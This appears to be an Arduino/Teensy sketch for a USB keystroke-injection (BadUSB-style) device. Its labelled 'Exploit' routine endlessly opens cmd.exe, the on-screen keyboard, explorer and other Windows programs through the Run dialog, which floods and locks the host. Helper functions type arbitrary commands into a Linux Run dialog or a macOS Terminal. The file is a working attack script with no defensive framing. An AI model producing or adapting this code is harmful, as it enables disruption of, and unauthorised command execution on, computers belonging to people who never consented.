int ledPin = 11;
int windows = 2;

void setup(){
}

void loop(){
  // Start
  delay(3000);
  digitalWrite(ledPin, HIGH);

  // Exploit
  WindowsPayload();

  // End
  digitalWrite(ledPin, LOW);
  delay(15000); // Long delay between runs
}

void WindowsPayload(){
  int d = 10;
  while(true){
    WindowsCommandRun("cmd.exe");
    delay(d);
    WindowsCommandRun("osk.exe");
    delay(d);
    WindowsCommandRun("magnifz.exe");
    delay(d);
    WindowsCommandRun("notepad.exe");
    delay(d);
    WindowsCommandRun("calc.exe");
    delay(d);
    WindowsCommandRun("mspaint.exe");
    delay(d);
    WindowsCommandRun("explorer.exe");
    delay(d);
    WindowsCommandRun("wupdmgr.exe");
    delay(d);
    //WindowsCommandRun("dfrg.exe");
    // delay(d);
    WindowsCommandRun("sndrec32.exe");
    delay(d);
    WindowsCommandRun("sndvol32.exe");
    delay(d);
  }
}


// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void GnomeKDECommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_ALT,KEY_F2);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void AppleCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_SPACE); // "apple" aka command key, space key -- open spotlight
  delay(1500);
  Keyboard.print("Terminal.app");
  delay(1000);

  KeyPress(KEY_ENTER);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}










